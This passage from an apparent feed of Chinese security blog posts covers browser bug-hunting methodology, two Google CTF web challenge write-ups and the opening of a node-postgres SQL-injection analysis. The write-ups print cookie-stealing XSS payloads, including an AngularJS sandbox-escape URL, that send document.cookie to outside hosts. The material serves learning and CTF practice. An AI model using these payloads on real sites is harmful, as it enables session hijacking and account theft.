data-rawwidth=&quot;1296&quot; data-rawheight=&quot;725&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;检查冷门的老功能&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这些功能常常不被人们重视：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;非标准化功能&lt;/li&gt;&lt;li&gt;冷门功能&lt;/li&gt;&lt;li&gt;常规插件&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;同样地，我们也可以通过发行记录，或者从已有的研究报告中来探索这些功能。&lt;/p&gt;&lt;p&gt;打个比方：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1b282742cbc694cbd423b4c1044cbac9.png_r.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;656&quot;&gt;&lt;p&gt;我用 dialogArguments/returnValue 时，发现数据可以传输到任意窗口，此处是否有 SOP 绕过漏洞呢？&lt;/p&gt;&lt;p&gt;在用 Dailog 时，用户不能操作其它窗口，这有没有可能引发 UI 相关的问题呢？&lt;/p&gt;&lt;h2&gt;&lt;b&gt;枚举法 — 延伸已经存在的漏洞&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们可以去挖掘一下常见机制的问题：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;JavaScript 的 HTTP 通信机制（sendBeacon，Fetch，Worker）&lt;/li&gt;&lt;li&gt;浏览器弹窗机制（alert，confirm，getUserMedia）&lt;/li&gt;&lt;li&gt;MIME 类型（text / javascript, image / svg + xml, application / octet-stream ...）&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;研究已经被列为高危的功能也很奏效：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;windows 对象&lt;/li&gt;&lt;li&gt;HTTP 泄露&lt;/li&gt;&lt;li&gt;HTML5 Security Cheatsheet&lt;/li&gt;&lt;/ul&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-70f4c79d48f1a6e95a6b857dcef07332.png_r.jpg&quot; data-rawwidth=&quot;1390&quot; data-rawheight=&quot;793&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;通过枚举法，我们能更好地集中到有效目标上。比方说：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c6308c273bcfe3f16501809ef54ee9a0.png_r.jpg&quot; data-rawwidth=&quot;1403&quot; data-rawheight=&quot;797&quot;&gt;&lt;p&gt;在这里，我们可以得知IE可以运行 CSS 里的脚本，这是否意味着我们可以用它来进行 XSS 或者过滤器绕过呢？&lt;/p&gt;&lt;h2&gt;&lt;b&gt;从 commit 历史中挖掘漏洞&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们可以通过 git 历史来发现有趣的特性，比如说：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;对移动系统的支持（3d Touch, Spotlight, Universal Links)&lt;/li&gt;&lt;li&gt;正在完善中的功能（Web App Manifest, Geckoview)&lt;/li&gt;&lt;/ul&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-173aca2d5f67a43f9e733ea87bac986a.png_r.jpg&quot; data-rawwidth=&quot;1431&quot; data-rawheight=&quot;794&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;那么，我们如何发现值得关注的点呢：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;已经被开发者标明为高危的功能&lt;/li&gt;&lt;li&gt;实现复杂的第三方库(SQLite, Alamofire)&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;我们再来看个例子，这是一个 Chrome 的 commit 记录：&lt;a href=&quot;https://goo.gl/xo6MMV&quot;&gt;Https://goo.gl/xo6MMV&lt;/a&gt;&lt;/p&gt;&lt;p&gt;在 commit 之前，chrome 并没有对国际化字符进行一个良好的处理，以下图片的 a 实际上是Cyrillic 字符集的 U+0430（并不是英语的a0）:&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-57709447a88ff7b3d6c95830185eaf09.png_r.jpg&quot; data-rawwidth=&quot;368&quot; data-rawheight=&quot;84&quot;&gt;&lt;p&gt;而:则是 U+0589，/是 U+2215&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1f890692dea45a6649e1a5ef08a2d97d.png_r.jpg&quot; data-rawwidth=&quot;376&quot; data-rawheight=&quot;65&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我汇报了这个问题，不过谷歌的解决方法是简单粗暴地禁用国际化域名。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c632d565eaccb34623c0705081bfa436.png_r.jpg&quot; data-rawwidth=&quot;853&quot; data-rawheight=&quot;154&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这个 commit 记录则增加了两个潜在的攻击点：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;用 SQLite 存储数据是否意味着有 SQL 注入？&lt;/li&gt;&lt;li&gt;将变量插入到页面中时候会导致 XSS?&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;当浏览器的一个功能有如下特点时，就往往意味着该功能有问题：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;将 URL 给 API，它会返回特定的标志&lt;/li&gt;&lt;li&gt;CSP 运行异常&lt;/li&gt;&lt;li&gt;你能发送任意 header 给一个目标&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;如果你知道要攻击的具体目标，那么你可以检查：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;location 返回的值&lt;/li&gt;&lt;li&gt;函数的行为&lt;/li&gt;&lt;li&gt;CSP 实现是否正确？&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;寻找字符集漏洞&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;通过浏览器对字符集处理的不当，我们可以挖掘许多问题。&lt;/p&gt;&lt;p&gt;各个浏览器对字符集的支持：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e208f0fc6ac38df5bb25e02b6e79a46d.png_r.jpg&quot; data-rawwidth=&quot;938&quot; data-rawheight=&quot;533&quot;&gt;&lt;p&gt;比方说 CVE-2013-5612，当你在 POST 请求中不指定字符集，那么它就会默认使用上一个被指定的字符集。我们可以利用支持上的差异性来达到绕过 XSS Auditor&lt;/p&gt;&lt;h2&gt;&lt;b&gt;寻找第三方库的漏洞&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在 Pwn2Own 比赛中，来自长亭科技的研究人员成功地利用 SQLite 的内存损坏攻破了 Safari。同理，我们也可以在下面的lib中寻找漏洞：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c45843420bc4a2ac0560d7d79bb53d35.png_r.jpg&quot; data-rawwidth=&quot;1655&quot; data-rawheight=&quot;609&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;其它攻击面&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;浏览器解析特殊协议（比如 about）也可能产生种种问题。当我们在 firefox 输入about:neterror?e=nssBadCert&amp;amp;d=Hello%20Guys!时，会有：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5cdd1073973d2976fad03494e5bc7070.png_r.jpg&quot; data-rawwidth=&quot;975&quot; data-rawheight=&quot;522&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;不忘学习前人经验&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在我们找漏洞的同时，不要忘记学习前人的思路，我们应该多想想这些问题：漏洞是什么类型的？他们是怎么找到漏洞的？这个漏洞又为何出现的？&lt;br&gt;我们可以通过 Security Advisor（&lt;a href=&quot;https://www.mozilla.org/en-US/security/advisories/&quot;&gt;mozilla&lt;/a&gt;，&lt;a href=&quot;https://chromereleases.googleblog.com/2017/07/stable-channel-update-for-desktop.html&quot;&gt;chrome&lt;/a&gt;），以及私人 blog 来学习寻找漏洞的过程。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;深入研究目标&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;为了深入探索一个目标，我们需要了解一下特性：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;这个功能是用来干什么的&lt;/li&gt;&lt;li&gt;如何使用它&lt;/li&gt;&lt;li&gt;输入和输出是什么&lt;/li&gt;&lt;li&gt;有没有什么过滤&lt;/li&gt;&lt;li&gt;我们能否利用它绕过安全机制&lt;/li&gt;&lt;li&gt;我们能否用它攻击安全站点&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;那么，我们应该用什么手段去深度挖掘呢？&lt;/p&gt;&lt;ul&gt;&lt;li&gt;亲自使用一遍&lt;/li&gt;&lt;li&gt;审计代码&lt;/li&gt;&lt;li&gt;审计可执行文件（反汇编）&lt;/li&gt;&lt;li&gt;查看软件 log&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;就拿 Fetch API 来说：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;fetch(&#39;http://api.example.jp/path&#39;,{  //我在这里能代入哪些地址？
+  method:&#39;POST&#39;,                        //我还能添加哪些方法?
+  headers: {
+    &#39;Content-Type&#39;:&#39;text/plain&#39;           //这里是否能插入其它header或者MIME类型?
+  },
+  body:&#39;Hello World!&#39;                   //body能插入哪些文字?
+  }).then(function(res){
+    console.log(res.headers.get(&#39;Content-Type&#39;)); //我能读取哪些header的值?
+  }).catch(function(err){
+  console.error(err);                   //抛出的错误时候包含了敏感信息?
+});
+&lt;/code&gt;&lt;p&gt;一个通过逆向找漏洞的例子：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-32a99fc8cdf79b70414afc5ac8616b9c.png_r.jpg&quot; data-rawwidth=&quot;942&quot; data-rawheight=&quot;536&quot;&gt;&lt;p&gt;edge 的一个 dll 包含了 XSS 过滤器的正则表达式，我们通过反向推导，或许可以找出 bypass payload。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;探索有趣的行为&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当我们发现了一些异常行为时，我们需要继续留心，因为这往往意味着更深层次的漏洞：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;跳转后，地址栏不更新 (URL Spoof)&lt;/li&gt;&lt;li&gt;某个输入导致浏览器崩溃或者暂停响应&lt;/li&gt;&lt;li&gt;HTML tag 不正常运行&lt;/li&gt;&lt;li&gt;文字乱码&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;比方说 CVE-2012-3695，我们输入https://aaa%2F@example.com/时，%2F会被解码，并返回https://aaa/@example.com/。本来被用做认证的 aaa%2F 被转化成了一个域名，这很有可能导致网络钓鱼。&lt;/p&gt;&lt;p&gt;挖掘这类漏洞有什么技巧呢？我们可以通过检查如下功能：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;URL scheme (http:, https:, ftp:, data:, resource:, about:, chrome-extension:)&lt;/li&gt;&lt;li&gt;Request method (GET, POST, HEAD, OPTIONS, TRACE)&lt;/li&gt;&lt;li&gt;浏览器怎么输出相关信息 (iframe, object / embed tag, svg foreignobject, Reading View)&lt;/li&gt;&lt;li&gt;浏览器怎么获取资源(img标签, video/audio标签, Worker的importScripts)&lt;/li&gt;&lt;li&gt;打开新 URL 的方法(Location头, meta刷新, window.open, 浏览器的返回键)&lt;/li&gt;&lt;li&gt;非常规输入（过长的字符串，HPP，空值，过大的数字，负数）&lt;/li&gt;&lt;li&gt;枚举各种其他元素&lt;br&gt;来快速发现可能的隐患。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;举几个例子：&lt;/p&gt;&lt;p&gt;在 CVE-2017-7789中，如果 firefox 在响应中收到多个 HSTS 头，那么 HSTS 就不会被启用。这时只要攻击者在普通的 HTTP 响应中包含几个 HSTS 头，那么他/她就可以绕过 HSTS 机制。&lt;/p&gt;&lt;p&gt;而在CVE-2015-4483里,我们在`feed:`后添加 URL，就可以绕过 Content Mixed Blocker&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b3e06c855ea6ce8dfd7e1a8391d2defc.png_r.jpg&quot; data-rawwidth=&quot;561&quot; data-rawheight=&quot;230&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;漏洞利用&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当你找到一个漏洞后，你应该如何利用它呢：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;想象如何在现有 Web 应用中利用&lt;/li&gt;&lt;ul&gt;&lt;li&gt;因为这一漏洞，我们可以攻击原本安全的网页&lt;/li&gt;&lt;li&gt;这个漏洞会导致浏览器安全机制失效&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;就算不能在某些场景利用，你也要考虑可以利用它的理想环境&lt;/li&gt;&lt;ul&gt;&lt;li&gt;如果这个网站是这样（设想状态）实现的，那么我们可以如何如何（攻击）&lt;/li&gt;&lt;li&gt;如果这个设想相对靠谱，那么该漏洞可能在特定环境有效&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;让我们来看看 firefox 插件的一&lt;a href=&quot;https://github.com/nishimunea/securitycamp2017&quot;&gt;怪异行为&lt;/a&gt;，虽然我们可以利用该漏洞对页面的 title（标签页的标题）进行 HTML 注入，然而由于 CSP，我们并不能触发 XSS。&lt;/p&gt;&lt;p&gt;当我们仔细观察%TITLE%，%CONTENT%的顺序后，就会发现一个模板注入漏洞：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7496b4fb635f52a6e22ada51c9f04b7c.png_r.jpg&quot; data-rawwidth=&quot;752&quot; data-rawheight=&quot;224&quot;&gt;&lt;p&gt;这样的话，只要我们插入 form 元素到%TITLE%时，即使不能 XSS，也能外带%CONTENT%给攻击者。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-ff757bf5f8992c3ae819e35d6cc9b5b1.png_r.jpg&quot; data-rawwidth=&quot;660&quot; data-rawheight=&quot;159&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在实际情境中，许多网站会将用户输入插入到页面 title，就拿 Google 来说：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-955aa85d635560b8780ff9281dbc45f5.png_r.jpg&quot; data-rawwidth=&quot;929&quot; data-rawheight=&quot;531&quot;&gt;&lt;p&gt;然而获取别人的搜索结果似乎没什么卵用，我们是否能得到更敏感的资料呢？&lt;/p&gt;&lt;p&gt;Gmail 似乎是一个不错的目标，我们可以发送一封恶意邮件给目标，当他/她展开该邮件时，页面 title 会更换为邮件标题：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-2677277016ff50b67e07b1c6089af265.png_r.jpg&quot; data-rawwidth=&quot;874&quot; data-rawheight=&quot;308&quot;&gt;&lt;p&gt;当用户点击 &lt;i&gt;Click Me&lt;/i&gt; 时，邮箱信息就会被传送给攻击者&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5464544040c91aedcb2eeaca584f1b22.png_r.jpg&quot; data-rawwidth=&quot;876&quot; data-rawheight=&quot;308&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;至此，我们成功地将该漏洞变废为宝。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i&gt;作者：&lt;b&gt;Masato Kinugawa&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;</description>
+<author>Twosecurity</author>
+<guid isPermaLink="false">2017-08-23-28719766</guid>
+<pubDate>Sun, 01 Jan 2017 00:00:00 +0800</pubDate>
+</item>
+<item>
+<title>Google CTF - Joe</title>
+<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-08-22-28688437.htm</link>
+<description>&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;Google CTF - Joe&lt;/title&gt;
+&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28688437&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;在 Joe 这道题中，我们会访问一个类似聊天室的页面，并通过文字和 AI Joe 对话。&lt;/p&gt;&lt;p&gt;Joe 有如下功能：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;打印自己的名字&lt;/li&gt;&lt;li&gt;设置新的名字&lt;/li&gt;&lt;li&gt;和你进行对话&lt;/li&gt;&lt;li&gt;向管理员汇报 bug&lt;/li&gt;&lt;/ul&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-43a2643a0882553c72ee71bbcfb4e776.png_r.jpg&quot; data-rawwidth=&quot;1920&quot; data-rawheight=&quot;1332&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;题目让我们偷管理员的 cookie。这样看来，汇报 bug 的功能就是用来给我们和管理员交互的。&lt;/p&gt;&lt;p&gt;乍一看，没发现什么漏洞。这里的消息是被当做 text 元素发送的，我一开始觉得此处不会引起 XSS。&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;var row = document.createElement(&#39;p&#39;);
+row.className = peer;
+row.textContent = message;
+conversation.appendChild(row);
+&lt;/code&gt;&lt;h2&gt;&lt;b&gt;持久型 XSS&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我花了一点时间在这里注入 XSS，因为上述原因，XSS 一直不执行。不过刷新页面后， payload 竟然生效了：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d190f66a263c80d1771a8bf853e7a6a2.png_r.jpg&quot; data-rawwidth=&quot;1920&quot; data-rawheight=&quot;1066&quot;&gt;&lt;p&gt;我们在自己的会话成功地 XSS，不过要怎么利用它？&lt;/p&gt;&lt;p&gt;我很快注意到了/message?msg=foo节点。网页会调用它来发送消息。我们注意一下/messaege节点 response 的最后一个 header:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Cache-Control: no-cache
+Content-Encoding: gzip
+X-Cloud-Trace-Context: 805d41a72f2623ac1728fed38fcac495;o=1
+Vary: Accept-Encoding
+Date: Mon, 19 Jun 2017 10:45:42 GMT
+Server: Google Frontend
+Content-Length: 64
+Content-Type: `text/html`
+&lt;/code&gt;&lt;p&gt;不仅如此，节点也不会给自己编码。这意味着我们可以通过它 XSS 其他用户。&lt;/p&gt;&lt;p&gt;我一开始的想法是这样的：在 bug 汇报中提交这个节点，它的 msg 则设置为可以窃取 cookie的 payload。很可惜的是，这个页面有防 CSRF 机制。我并不能这么利用。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;加入我的 Seesion&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在登录聊天室时，我发现了这个请求：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-3a924c7667fcc8a743fe55327036ef23.png_r.jpg&quot; data-rawwidth=&quot;1920&quot; data-rawheight=&quot;1217&quot;&gt;&lt;p&gt;如你所见，网页传递了一长串 token 给/login。这是不是意味着我们能通过它发送会话固定攻击呢？&lt;/p&gt;&lt;p&gt;我把浏览器调到匿名模式，再用相同的 token 登录一遍，然后惊奇地发现原先会话留下的  PoC：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d327036238f2d0a730e327c12ce6082d.png_r.jpg&quot; data-rawwidth=&quot;1280&quot; data-rawheight=&quot;723&quot;&gt;&lt;p&gt;我们成功地让另一个用户执行了 JavaScript。同理，我们可以在汇报 bug 时附上带有该 token的 URL，然后利用 self-xss 盗取管理员的 cookie。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-fef1b84b8c53a6aa753ce182eda72d3a.png_r.jpg&quot; data-rawwidth=&quot;1920&quot; data-rawheight=&quot;1287&quot;&gt;&lt;p&gt;我让管理员访问如下页面：&lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;html&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;iframe src=&quot;https://joe.web.ctfcompetition.com/login?id_token=eyJhbGciOiJSUzI1NiIsImtpZCI6ImEyOThhNTZiNmFjMDU0MzEyNTNkNDkwMzA4MTZhNWViZjk5YTEzYzUifQ.eyJhenAiOiIyODQ5NDAzNzA5MjUtY240aWZlZnVrMzNrbjBiODg3cHBwdjVmamI5MWU4cTcuYXBwcy5nb29nbGV1c2VyY29udGVudC5[...]&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;p&gt;并在自己的对话中插入：&lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;script&amp;gt;document.write(&#39;&amp;lt;img src=&quot;http://myserver.com?cookie?&#39; + document.cookie);&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;p&gt;这样，就可以成功地打到cookie了：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-56551f6824614c901f8501e1daece4e0.png_r.jpg&quot; data-rawwidth=&quot;1920&quot; data-rawheight=&quot;220&quot;&gt;&lt;p&gt;&lt;/p&gt;</description>
+<author>Twosecurity</author>
+<guid isPermaLink="false">2017-08-22-28688437</guid>
+<pubDate>Sun, 01 Jan 2017 00:00:00 +0800</pubDate>
+</item>
+<item>
+<title>Google CTF - Back to the past</title>
+<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-08-19-28630038.htm</link>
+<description>&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;Google CTF - Back to the past&lt;/title&gt;
+&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28630038&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;题目地址：&lt;b&gt;&lt;a href=&quot;https://b2p.web.ctfcompetition.com/&quot;&gt;https://b2p.web.ctfcompetition.com/&lt;/a&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这个 Web 页面用了 AngularJS 1.5.8 作为前端框架，源代码大概如下：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;function getWaybackUrl() {
+  return &#39;https://web.archive.org/web/&#39; + $scope.date_y + $scope.date_m + $scope.date_d + &#39;/&#39; + $scope.website;
+};
+...
+var q = $location.search();
+if (q[&#39;url&#39;]) $scope.website = q[&#39;url&#39;];
+if (q[&#39;d&#39;]) $scope.date_d = q[&#39;d&#39;];
+if (q[&#39;m&#39;]) $scope.date_m = q[&#39;m&#39;];
+if (q[&#39;y&#39;]) $scope.date_y = q[&#39;y&#39;];
+if (q[&#39;reported&#39;]) {
+  $location.search(&#39;reported&#39;, null);
+  $window.location = getWaybackUrl();
+}
+$scope.date = [$scope.date_d, $scope.date_m, $scope.date_y].join(&#39;/&#39;);
+$scope.setDate = () =&amp;gt; $scope.date = prompt(&quot;When do you want to go?&quot;, $scope.date) || $scope.date;
+...
+  .directive(&#39;wayback&#39;, function() {
+  return {
+      template: &#39;&amp;lt;iframe class=&quot;wayback-iframe&quot; ng-src=&quot;{{getWaybackUrl()}}&quot;&amp;gt;&amp;lt;/iframe&amp;gt;&#39;,
+  };
+})
+
+&lt;/code&gt;&lt;p&gt;这道题让我们访问一个页面，该页面的表单会提取当前的URL以及日期(年、月、日)，再把我们重定向到 webarchive.org。&lt;/p&gt;&lt;p&gt;Krzysztof Kotowicz 指出过&lt;a href=&quot;https://www.youtube.com/watch?v=ueEsOnHJZ80&amp;amp;feature=youtu.be&amp;amp;t=21m49s&quot;&gt;该类代码的问题&lt;/a&gt;。根据他的思路，我们在此处可以尝试模板注入。然后我们需要考虑绕过 Angular 沙箱的问题，幸运的是，&lt;a href=&quot;http://blog.portswigger.net/2017/05/dom-based-angularjs-sandbox-escapes.html&quot;&gt;Portswigger&lt;/a&gt; 以及 &lt;a href=&quot;https://gist.github.com/mccabe615/cc92daaf368c9f5e15eda371728083a3&quot;&gt;mccabe615&lt;/a&gt; 已经提出来许多 bypass 思路，我们直接用他们的方法就好了。现在，我们需要想个法子来将history.back(-1)&lt;i&gt;（译者注：当我们传递一个域名给该页面时，它会跳转到该主机的archve.org的备份页，虽然我们有模板注入了，但还是要先从archive.org退回到back&lt;br&gt;to past比赛题的页面）&lt;/i&gt;注入到代码。&lt;br&gt;来写个 PoC 试试吧:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://b2p.web.ctfcompetition.com/?url=http://google.com/%2F&amp;amp;d=1&amp;amp;m=01&amp;amp;y=%7B%7Ba%3DtoString().constructor.prototype;a.charAt%3Da.trim;$eval(%27a,ale
+rt(1),a%27)%7D%7D&amp;amp;reported=1
+&lt;/code&gt;&lt;p&gt;当我们点击了 &lt;i&gt;back&lt;/i&gt; 按钮时，Chrome 竟然弹窗了!&lt;br&gt;现在，我们要编写 exp 了。我们先来看看跳转到webarchive的URL：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://web.archive.org/web/XYZ/http://domain.com/&lt;/code&gt;&lt;p&gt;其中，XYZ=日、月、年&lt;/p&gt;&lt;p&gt;webarchive 只会显示站点的历史缓存，我们如何让它主动获取当前站点的内容，并执行history.back(-1)呢？我们先用目录穿越来强制webarchive获取站点的当时状态：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://b2p.web.ctfcompetition.com/?url=../../../save/http:%2F%2Four-domain.com%2F&amp;amp;d=1&amp;amp;m=01&amp;amp;y=%7B%7Ba%3DtoString().constructor.prototype;a.charAt%3Da.trim;$eval(%27a,alert(1),a%27)%7D%7D&amp;amp;reported=1&lt;/code&gt;&lt;p&gt;访问以上 URL 会被跳转到: &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://web.archive.org/save/http://our-domain.com/&lt;/code&gt;&lt;p&gt;这是我控制的一个页面，代码大概如下：&lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;html&amp;gt;
+&amp;lt;body&amp;gt;
+test
+&amp;lt;script src=&quot;/redirect.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;p&gt;注意，这个 redirect.js 不是内联的！这是它的代码：&lt;br&gt;history.back(-1)&lt;/p&gt;&lt;p&gt;现在我们翻翻服务器 log。因为 webarchive 需要更新内容，所以会有如下请求：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;207.241.225.236 - - [18/Jun/2017:00:35:47 +0000] &quot;GET / HTTP/1.1&quot; 200 4587 &quot;http://b2p.web.ctfcompetition.com/?url=..%2F..%2F..%2Fsave%2Fhttp:%2F%2Four-domain.com%2F&amp;amp;d=1&amp;amp;m=01&amp;amp;y=%7B%7Ba%3DtoString().constructor.prototype;a.charAt%3Da.trim;$eval(%27a,alert(1)%7D%7D&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/59.0.3071.104 Safari/537.36&quot;
+207.241.226.232 - - [18/Jun/2017:00:35:48 +0000] &quot;GET /redirect.js HTTP/1.1&quot; 200 18 &quot;http://our-domain.com/&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/59.0.3071.104 Safari/537.36&quot;
+&lt;/code&gt;&lt;p&gt;这样，我们就能理所当然地推导出最终Exp：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://b2p.web.ctfcompetition.com/?url=../../../../../save/http:%2F%2Four-domain.com%2F&amp;amp;d=1&amp;amp;m=01&amp;amp;y=%7B%7Ba%3DtoString().constructor.prototype;a.charAt%3Da.trim;$eval(%27a,window.location=%22http://kyprizel.net/x%22%2bdocument.cookie,a%27)%7D%7D&amp;amp;reported=1
+&lt;/code&gt;&lt;p&gt;最后，我们得到了flag： &lt;i&gt;CTF{BY0uWeNtBacK2tHeDOM}&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
+<author>Twosecurity</author>
+<guid isPermaLink="false">2017-08-19-28630038</guid>
+<pubDate>Sun, 01 Jan 2017 00:00:00 +0800</pubDate>
+</item>
+<item>
+<title>Node.js postgres 从 SQL注入到代码执行</title>
+<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-08-17-28575189.htm</link>
+<description>&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;Node.js postgres 从 SQL注入到代码执行&lt;/title&gt;
+&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28575189&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;node-postgres 是 Node 版的 PostgreSQL 接口的实现。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c723150d4b35ba6db79ecf578d6e3475.jpg_r.jpg&quot; data-rawwidth=&quot;403&quot; data-rawheight=&quot;450&quot;&gt;&lt;p&gt;几天前，Sehrope Sarkuni 在这个 lib 的 SQL 解析部分发现了远程代码注入。漏洞的起因是解析器将用户提供的表名封装为函数。当表名为合法 JavaScript 代码时，我们就可触发该漏洞。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;漏洞分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;成功连接数据库后，客户端会触发 readyForQuery&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;con.once(&#39;readyForQuery&#39;, function () {
+    self._connecting = false
+    self._connected = true
+    self._attachListeners(con)
+    con.removeListener(&#39;error&#39;, connectingErrorHandler)
+    con.on(&#39;error&#39;, connectedErrorHandler)
+...
+}
